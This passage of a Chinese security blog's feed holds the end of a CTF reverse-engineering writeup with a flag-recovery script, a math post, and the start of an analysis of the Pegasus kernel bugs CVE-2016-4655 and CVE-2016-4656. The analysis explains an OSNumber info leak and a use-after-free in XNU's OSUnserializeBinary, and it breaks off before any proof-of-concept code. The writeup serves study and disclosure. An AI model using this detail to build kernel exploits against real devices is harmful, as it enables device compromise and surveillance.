</div><div class="line">    print(&quot;encryptKey=[&quot;, end=&quot;&quot;)</div><div class="line">    for idx in range(len(key)):</div><div class="line">        encryptKey.append(key[idx] ^ 0x20)</div><div class="line">        print(&quot;%x &quot; % encryptKey[idx], end=&quot;&quot;)</div><div class="line">    print(&quot;]&quot;)  </div><div class="line">        </div><div class="line"></div><div class="line">    flag = []</div><div class="line">    print(&quot;[i]find the flag&quot;)</div><div class="line">    for i in range(len(encryptKey)):</div><div class="line">        count = 0x00</div><div class="line">        while(count &lt;= 0x7f):</div><div class="line">            one = count &gt;&gt; (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d))</div><div class="line">            two = count &lt;&lt; (0x8 - (((0 &gt;&gt; 0x1d) + i) &amp; 0x7 - (0 &gt;&gt; 0x1d)))</div><div class="line">            if((((one | two) ^ i) &amp; 0xff) == encryptKey[i]):</div><div class="line">                flag.append(count)</div><div class="line">                break</div><div class="line">            count = count + 1</div><div class="line">                </div><div class="line">    print(&quot;flag = &quot;,end=&quot;&quot;)</div><div class="line">    for i in range(len(flag)):</div><div class="line">        print(&quot;%c&quot; % flag[i], end=&quot;&quot;)   </div><div class="line">        </div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    key = getflag()</div></pre></td></tr></table></figure><p>最后运行程序得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[i]start to encrypt key</div><div class="line">encryptKey=[53 ad d2 6c e7 f4 5b d7 38 12 51 2d ef fc 47 6f 5f 2b 4d ]</div><div class="line">[i]find the flag</div><div class="line">flag = SYC&#123;&gt;&gt;Wh06m1&gt;&gt;R0Ot&#125;</div></pre></td></tr></table></figure><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/pwnhub-CTF-re150/0-4.png?raw=true" alt="0-0"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;第一次做pwnhub题，最近参加了几场ctf比赛，pwnhub的题还是比较有一定难度
      
    
    </summary>
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CTF/"/>
    
      <category term="writeup" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>一道高中数学题的思考？</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/04/math/math/</id>
    <published>2017-05-04T12:37:59.000Z</published>
    <updated>2017-05-04T15:09:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 突然在邮件中收到Quora中这样一个问题”What does X equal in $\sqrt{x+15} + \sqrt{x} = 15$? “ 凭着曾经对数学的热爱，我点了进去。顺便学习了点知识。</p></blockquote><h2 id="0x01-你会怎么解决？"><a href="#0x01-你会怎么解决？" class="headerlink" title="0x01 你会怎么解决？"></a>0x01 你会怎么解决？</h2><p>不得不承认，这种题型在初高中时候还是蛮常见的，在我的脑海里，也别无他法，一步一步去根号解方程吧。但都知道，同时平方带来就是可能会升高次数，有时候拿到答案还是挺繁琐的，至少计算上来说是这样的。</p><h2 id="0x02-方法1-平方法"><a href="#0x02-方法1-平方法" class="headerlink" title="0x02 方法1 平方法"></a>0x02 方法1 平方法</h2><p>通常解决这个问题的方法是将方程的两边平方并简化，并保持平方，直到方程中没有平方根</p><p>$\sqrt{x+15} + \sqrt{x} = 15$ </p><p>$(\sqrt{x+15} + \sqrt{x})^2 = 15^2$ </p><p>$x+15 + 2\sqrt{(x+15)x} + x = 225$ </p><p>$2\sqrt{(x+15)x} = 210 - 2x$  </p><p>$\sqrt{(x+15)x} = 105 - x$  </p><p>$(\sqrt{(x+15)x})^2 = (105 - x)^2$  </p><p>$x^2 + 15x = 11025 - 210x +x^2$  </p><p>$225x = 11025$  </p><p>$ x = 49$<br>思维过程很清楚，但明显计算上有点繁琐。  </p><h2 id="0x03-方法2-拼凑法"><a href="#0x03-方法2-拼凑法" class="headerlink" title="0x03 方法2 拼凑法"></a>0x03 方法2 拼凑法</h2><p>不一定可靠，但一定最快。大多情况下，都是开方后是整数。所以每个完全平方数的序列（$1^22^23^3…6^27^28^2… =&gt; 1 4 9 16 25 36 49 64 …$）</p><p>哪两个数相差15呢？很明显64 - 49 = 15，也许你觉得这很不靠谱，其实至少对于开方是整数的结果来说是很快的，觉得慢主要是你还不熟练。因为并不是一个一个的去试验，因为相邻之差是递增且快。类似二叉树来查找会很快得出结果。  </p><p>$\sqrt{49 + 15} + \sqrt{49} = 15$  </p><p>$7 + 8 = 15$<br>最快，但不一定可靠。</p><h2 id="0x04-方法3-平方差法"><a href="#0x04-方法3-平方差法" class="headerlink" title="0x04 方法3 平方差法"></a>0x04 方法3 平方差法</h2><p>暂且称作平方差法吧，这个方法是我最推荐的，既快又准。<br>原式：$\sqrt{x+15} + \sqrt{x} = 15$  (1)</p><p>设 $\sqrt{x+15} - \sqrt{x} = k$  </p><p>又 $(\sqrt{x+15} - \sqrt{x})(\sqrt{x+15} + \sqrt{x})= 15k$ </p><p>解得： $k = 1$    </p><p>所以 $\sqrt{x+15} - \sqrt{x} = 1$ （2）</p><p>然后<code>（1）+ (2)</code>:   $2\sqrt{x+15} = 16$  </p><p>解得: $x = 49$  </p><p>多么棒的一个方法 I love it！  </p><h2 id="0x05-我与数学"><a href="#0x05-我与数学" class="headerlink" title="0x05 我与数学"></a>0x05 我与数学</h2><p>从小数学就比语文好的我，数学确实给了我很多自信，想破头皮的去思考一个一个的题。一如既往的热爱，以致于高考只填了一个专业–数学。由于种种原因，没能选上，去来到了计算机相关的专业。计算机科学同样是一个迷人的世界，那种理解本质，控制计算机的运行是让人着迷的。在反馈上来说，计算机比做数学得到的反馈更真实，快速。做数学题的时候总是找不到方向，得到的反馈少且慢，容易让人沮丧，想必这也是大多人讨厌数学的原因之一吧。虽然现在更热爱计算机，但心底里仍然有一个数学的种子。以至于很多时候看到感兴趣的题也会拿上纸笔算一算，知乎上也关注了相关话题，还有一个自己特别骄傲的回答，关于高中数列的，具体情况移步<a href="https://www.zhihu.com/question/30050677" target="_blank" rel="external">高考数学数列放缩总结技巧有哪些？</a><br>相信不管是现在还是将来，数学都是我最深处的支持。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 突然在邮件中收到Quora中这样一个问题”What do
      
    
    </summary>
    
      <category term="关于数学" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/%E5%85%B3%E4%BA%8E%E6%95%B0%E5%AD%A6/"/>
    
    
      <category term="数学" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Pegasus内核漏洞及PoC分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/01/Pegasus内核漏洞及PoC分析/Pegasus内核漏洞及PoC分析/</id>
    <published>2017-05-01T06:52:45.000Z</published>
    <updated>2017-05-02T14:38:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><blockquote><p> 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，实际却是连续几天几夜的分析的结束。本文将详细介绍iOS三叉戟漏洞，其影响涉及OS X 10.11.6和 iOS 9.3.4。这里为了方便以及简单，环境为OS X<br> 关注iOS安全的技术人员都或多或少的了解这个漏洞，这里就不多说，可以参考下面的链接或者自行Google<br> 1.<a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOS“远程越狱”间谍软件Pegasus技术分析</a><br> 2.<a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOS三叉戟漏洞补丁分析、利用代码 公布（POC</a><br> 3.<a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus – 针对iOS设备的APT攻击分析</a></p></blockquote><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><ol><li><code>OSUnserializeBinary</code>概述</li><li>漏洞分析-CVE-2016-4655，CVE-2016-4656</li><li>漏洞利用-PoC分析</li><li>总结</li></ol><h2 id="0x02-OSUnserializeBinary概述"><a href="#0x02-OSUnserializeBinary概述" class="headerlink" title="0x02 OSUnserializeBinary概述"></a>0x02 <code>OSUnserializeBinary</code>概述</h2><ol><li><p>序列化与反序列化<br>在软件开发的过程中，两个模块通信时就需要序列化与发序列化，常见的xml-&gt;JSON，对应的反序列化JOSN-&gt;xml。简单来说就是数据格式上的一种相互转化。<br>在XNU内核也有一个实现，<code>OSUnserializeXML</code>(将xml格式转化为内核数据对象)和<code>OSUnserializeBinary</code>(将二进制格式转化为内核数据对象)</p></li><li><p><code>OSUnserializeBinary</code>的二进制格式<br><code>OSUnserializeBinary</code>这个函数将连续的二进制流分成<code>uint32_t</code>32字节来处理。所以32位的整数就有特殊含义来表示一些数据结构。如下  </p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> kOSSerializeBinarySignature <span class="meta-string">"\323\0\0"</span> <span class="comment">/* 0x000000d3 */</span></span></div><div class="line"></div><div class="line"><span class="keyword">enum</span> &#123;</div><div class="line">    kOSSerializeDictionary      = <span class="number">0x01000000</span>U,</div><div class="line">    kOSSerializeArray           = <span class="number">0x02000000</span>U,</div><div class="line">    kOSSerializeSet             = <span class="number">0x03000000</span>U,</div><div class="line">    kOSSerializeNumber          = <span class="number">0x04000000</span>U,</div><div class="line">    kOSSerializeSymbol          = <span class="number">0x08000000</span>U,</div><div class="line">    kOSSerializeString          = <span class="number">0x09000000</span>U,</div><div class="line">    kOSSerializeData            = <span class="number">0x0a000000</span>U,</div><div class="line">    kOSSerializeBoolean         = <span class="number">0x0b000000</span>U,</div><div class="line">    kOSSerializeObject          = <span class="number">0x0c000000</span>U,</div><div class="line"></div><div class="line">    kOSSerializeTypeMask        = <span class="number">0x7F000000</span>U,</div><div class="line">    kOSSerializeDataMask        = <span class="number">0x00FFFFFF</span>U,</div><div class="line"></div><div class="line">    kOSSerializeEndCollection   = <span class="number">0x80000000</span>U,</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>这里的<code>0x000000d3</code>代表了这个数据流的签名即开始的32位必须为该整数值，下面有一个字典，数组，集合等集合类数据结构，也有数字，字符串等基本数据结构表示。<code>kOSSerializeTypeMask</code>和<code>kOSSerializeDataMask</code>分别为类型和数据大小掩码。<code>kOSSerializeEndCollection</code>代表当前集合(dic，array或set)是否结束。<br>可以看到，31位表示当前集合是否结束，30-24位表示当前数据类型，23-0表示元素的长度。</p><table><thead><tr><th>当前集合是否结束</th><th>当前数据类型</th><th>当前元素长度</th></tr></thead><tbody><tr><td>0</td><td>0000000</td><td>000000000000000000000000</td></tr></tbody></table><p>例如下面的二进制数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x000000d3</span> <span class="number">0x81000000</span> <span class="number">0x09000004</span> <span class="number">0x41414141</span> <span class="number">0x8b000001</span></div></pre></td></tr></table></figure><p>则对应：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;dict&gt;</div><div class="line">    &lt;string&gt;AAAA&lt;/string&gt;  //键key</div><div class="line">    &lt;boolean&gt;1&lt;/boolean&gt;  //值value</div><div class="line">&lt;/dict&gt;</div></pre></td></tr></table></figure><p>这样的数据结构。对应过程也很简单，<code>0x000000d3</code>标志为合法的签名，<code>0x81000000</code>为dic类型且为最后一个元素，<code>0x09000004</code>为4字节大小的字符串，<code>0x8b000001</code>为bool型，所以只需用最后一位代表true或false</p><ol><li><code>OSUnserializeBinary()</code>分析<br>完整源代码见文末，下面将对其中几个重要的地方分别做分析说明  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">while (ok)</div><div class="line">&#123;</div><div class="line">    bufferPos += sizeof(*next);</div><div class="line">    if (!(ok = (bufferPos &lt;= bufferSize))) break;</div><div class="line">    key = *next++;</div><div class="line"></div><div class="line">    len = (key &amp; kOSSerializeDataMask);</div><div class="line">    wordLen = (len + 3) &gt;&gt; 2;</div><div class="line">    end = (0 != (kOSSerializeEndCollecton &amp; key));</div><div class="line"></div><div class="line">    newCollect = isRef = false;</div><div class="line">    o = 0; newDict = 0; newArray = 0; newSet = 0;</div><div class="line"></div><div class="line">    switch (kOSSerializeTypeMask &amp; key)</div><div class="line">    &#123;</div><div class="line">        case kOSSerializeDictionary:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeArray:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeSet:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeObject:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeNumber:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeSymbol:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeString:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeData:</div><div class="line">        ...</div><div class="line"></div><div class="line">        case kOSSerializeBoolean:</div><div class="line">        ...</div><div class="line"></div><div class="line">        default:</div><div class="line">            break;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure><p>进行一些初始化和检查后就进入<code>while(ok)</code>循环，并且是以32位的整数位单位遍历循环，读取当前的整数<code>key</code>，确定其长度<code>len</code>，当前集合31位是否设置<code>end</code>。并通过类型掩码<code>kOSSerializeTypeMask</code>确定其<code>key</code>的类型从而进入不同的case。例如我们看<code>kOSSerializeDictionary</code>例子  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeDictionary:</div><div class="line">    o = newDict = OSDictionary::withCapacity(len);</div><div class="line">    newCollect = (len != 0);</div><div class="line">    break;</div></pre></td></tr></table></figure><p>o为指向当前反序列化对象的指针，在每种case中被指定  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeData:</div><div class="line">    bufferPos += (wordLen * sizeof(uint32_t));</div><div class="line">    if (bufferPos &gt; bufferSize) break;</div><div class="line">    o = OSData::withBytes(next, len);</div><div class="line">    next += wordLen;</div><div class="line">    break;</div></pre></td></tr></table></figure><p>这里当遇到一个为<code>kOSSerializeData</code>类型时，根据其<code>len</code>找到其数据并将其存储在<code>OSData</code>数据结构中，并移动<code>next</code>。其他的case都做类似对应的处理。<br>跳出switch  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!(ok = (o != 0))) break;</div></pre></td></tr></table></figure><p>因为每一次循环都会进入<code>case</code>并将o设置为对应对象才合法，当等于0时就说明不合法，则退出。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if (!isRef)</div><div class="line">&#123;</div><div class="line">    setAtIndex(objs, objsIdx, o);</div><div class="line">    if (!ok) break;</div><div class="line">    objsIdx++;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里很重要将与后面的漏洞相关，首先判断<code>isRef</code>是否被设置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeObject:</div><div class="line">if (len &gt;= objsIdx) break;</div><div class="line">o = objsArray[len];</div><div class="line">o-&gt;retain();</div><div class="line">isRef = true;</div><div class="line">break;</div></pre></td></tr></table></figure><p><code>isRef</code>只有当当前的类型为<code>kOSSerializeObject</code>即引用类型是才被设为<code>true</code>，这里引用的意思则表示当前指向<code>dic</code>中其他数据，其值为对应下标。<br>回到前面那里，下面重点关注<code>setAtIndex</code>这个宏定义</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">#define setAtIndex(v, idx, o)                                                           \</div><div class="line">    if (idx &gt;= v##Capacity)                                                        \</div><div class="line">    &#123;                                                                                   \</div><div class="line">        uint32_t ncap = v##Capacity + 64;                                               \</div><div class="line">        typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));  \</div><div class="line">        if (!nbuf) ok = false;                                                          \</div><div class="line">        if (v##Array)                                                                   \</div><div class="line">        &#123;                                                                               \</div><div class="line">            bcopy(v##Array, nbuf, v##Capacity * sizeof(o));                             \</div><div class="line">            kfree(v##Array, v##Capacity * sizeof(o));                                   \</div><div class="line">        &#125;                                                                               \</div><div class="line">        v##Array    = nbuf;                                                             \</div><div class="line">        v##Capacity = ncap;                                                             \</div><div class="line">    &#125;                                                                                   \</div><div class="line">    if (ok) v##Array[idx] = o;</div></pre></td></tr></table></figure><p>看着很复杂，但简单来说就是如果数组大小不够的话就增加大小，然后就将其之前的o指向的对象放到<code>objs</code>数组中对应的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (dict)</div><div class="line">&#123;</div><div class="line">        <span class="keyword">if</span> (sym)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> (o != dict) ok = dict-&gt;setObject(sym, o, <span class="literal">true</span>);</div><div class="line">            o-&gt;release();</div><div class="line">            sym-&gt;release();</div><div class="line">            sym = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            sym = OSDynamicCast(OSSymbol, o);</div><div class="line">            <span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</div><div class="line">            &#123;</div><div class="line">                sym = (OSSymbol *) OSSymbol::withString(str);</div><div class="line">                o-&gt;release();</div><div class="line">                o = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">            ok = (sym != <span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">array</span>)</div><div class="line">    &#123;</div><div class="line">        ok = <span class="built_in">array</span>-&gt;setObject(o);</div><div class="line">        o-&gt;release();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>)</div><div class="line">    &#123;</div><div class="line">        ok = <span class="built_in">set</span>-&gt;setObject(o);</div><div class="line">       o-&gt;release();</div><div class="line">   &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        assert(!parent);</div><div class="line">        result = o;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>对解析出来的当前的集合做对应处理，比如这里的如果<code>dic</code>为真，因为<code>dic</code>字典数据结构需要<code>key-&gt;value</code>键值对的形式，所以先判断<code>sym</code>，若没设置，则代表当前<code>o</code>对象为key，则将其转化为<code>OSSymbol</code>类型，设置<code>sym</code>为true并将<code>o</code>free，那么下一次的<code>o</code>代表的对象一定是值，然后就将<code>sym</code>和<code>o</code>以键值对的形式存储在<code>dic</code>字典中，如此交替。<br>后面的代码对漏洞来说不是很重要了  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">if (newCollect)</div><div class="line">&#123;</div><div class="line">if (!end)</div><div class="line">&#123;</div><div class="line">stackIdx++;</div><div class="line">setAtIndex(stack, stackIdx, parent);</div><div class="line">if (!ok) break;</div><div class="line">&#125;</div><div class="line">DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">parent = o;</div><div class="line">dict   = newDict;</div><div class="line">array  = newArray;</div><div class="line">set    = newSet;</div><div class="line">end    = false;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (end)</div><div class="line">&#123;</div><div class="line">if (!stackIdx) break;</div><div class="line">parent = stackArray[stackIdx];</div><div class="line">DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);</div><div class="line">stackIdx--;</div><div class="line">set   = 0; </div><div class="line">dict  = 0; </div><div class="line">array = 0;</div><div class="line">if (!(dict = OSDynamicCast(OSDictionary, parent)))</div><div class="line">&#123;</div><div class="line">if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>简单来说就是判断是否有新集合，如有的话，就将其压入栈中，那么后面的元素都放到新集合中，当<code>end</code>时就将整个新集合放入之前的<code>dic</code>。</p><h2 id="0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656"><a href="#0x03-漏洞分析-CVE-2016-4655，CVE-2016-4656" class="headerlink" title="0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656"></a>0x03 漏洞分析-CVE-2016-4655，CVE-2016-4656</h2><p>这里将介绍两个漏洞：1，CVE-2016-4655-infoleak漏洞；2，CVE-2016-4656-UAF漏洞</p><h3 id="CVE-2016-4655-infoleak"><a href="#CVE-2016-4655-infoleak" class="headerlink" title="CVE-2016-4655-infoleak"></a>CVE-2016-4655-infoleak</h3><p>和我们之前分析的linux中printf格式漏洞类似，利用这个漏洞我们可以获取到内核栈中的地址信息，这些信息对于绕过KASLR内核地址空间随机偏移非常有用，因为系统每次启动时内核地址都偏移了一随机数，一旦确定了KSALR，我们就可以进一步做ROP等攻击。</p><p>下面看漏洞点，回顾之前<code>kOSSerializeNumber</code>这个case内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeNumber:</div><div class="line">    bufferPos += sizeof(long long);</div><div class="line">    if (bufferPos &gt; bufferSize) break;</div><div class="line">    value = next[1];</div><div class="line">    value &lt;&lt;= 32;</div><div class="line">    value |= next[0];</div><div class="line">    o = OSNumber::withNumber(value, len);</div><div class="line">    next += 2;</div><div class="line">    break;</div></pre></td></tr></table></figure><p>这里存在什么问题呢？这里没有检查<code>OSNumber</code>的长度，也就是说我们可以创建一个任意长度的<code>OSNumber</code>，进而在内核读取的时候越界，然后泄漏内核地址信息。</p><h3 id="CVE-2016-4656-UAF漏洞"><a href="#CVE-2016-4656-UAF漏洞" class="headerlink" title="CVE-2016-4656-UAF漏洞"></a>CVE-2016-4656-UAF漏洞</h3><p>UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。<br>来看下漏洞点，下面的代码是序列化字典dic将<code>OSString</code>这个键转化为<code>OSSymbol</code>，见下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (dict)</div><div class="line">&#123;</div><div class="line">        <span class="keyword">if</span> (sym)</div><div class="line">        &#123;</div><div class="line">            ...</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            sym = OSDynamicCast(OSSymbol, o);</div><div class="line">            <span class="keyword">if</span> (!sym &amp;&amp; (str = OSDynamicCast(OSString, o)))</div><div class="line">            &#123;</div><div class="line">                sym = (OSSymbol *) OSSymbol::withString(str);</div><div class="line">                o-&gt;release();</div><div class="line">                o = <span class="number">0</span>;</div><div class="line">            &#125;</div><div class="line">            ok = (sym != <span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>这里<code>o-&gt;release()</code>有什么问题呢?还记得<code>objsArray</code>吧，用来存储所有的对象，但是用<code>setAtIndex</code>这个宏来将所有的对象<code>o</code>存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面<code>kOSSerializeObject</code>中的<code>switchcase</code>。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">case kOSSerializeObject:</div><div class="line">    if (len &gt;= objsIdx) break;</div><div class="line">    o = objsArray[len];</div><div class="line">    o-&gt;retain();</div><div class="line">    isRef = true;</div><div class="line">    break;</div></pre></td></tr></table></figure><p>此时之前存储在之前的<code>objsArray</code>的<code>OSString</code>已经free，而 <code>o = objsArray[len]; o-&gt;retain();</code>由对其进行了<code>retain</code>引用，好的一个完美的UAF漏洞。<br>所以我们可以构造一个字典<code>dic</code>，其中<code>OSString</code>包含一些配对的值，然后序列化一个<code>kOSSerializeObject</code>引用对象，<code>OSString</code>将调用<code>retain</code>，但却是一个被释放的对象。  </p><h2 id="0x04-漏洞利用-PoC分析"><a href="#0x04-漏洞利用-PoC分析" class="headerlink" title="0x04 漏洞利用-PoC分析"></a>0x04 